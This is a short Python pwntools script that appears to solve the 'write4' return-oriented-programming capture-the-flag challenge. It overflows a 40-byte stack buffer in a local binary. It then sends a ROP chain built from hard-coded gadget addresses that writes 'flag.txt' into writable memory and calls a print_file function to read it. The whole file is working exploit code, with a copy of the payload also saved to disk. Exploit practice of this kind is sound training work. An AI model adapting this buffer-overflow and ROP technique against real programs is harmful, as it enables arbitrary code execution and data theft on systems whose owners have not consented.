#!/usr/bin/env python3

from pwn import *

pwn = './write4'
buffer = 40

io = process(pwn)
io.recvuntil(b'> ')

f = open('input','wb')

POP_RDI = 0x400693
POP_R14_R15 = 0x400690
MOV_R14_R15 = 0x400628
PRINT_FILE = 0x400510


payload = p64(POP_R14_R15) + p64(0x601030) + b'flag.txt' + p64(MOV_R14_R15) + p64(POP_RDI) + p64(0x601030) + p64(PRINT_FILE)  

f.write(b'A'*buffer + payload)

io.sendline(b'A'*buffer + payload)
io.interactive()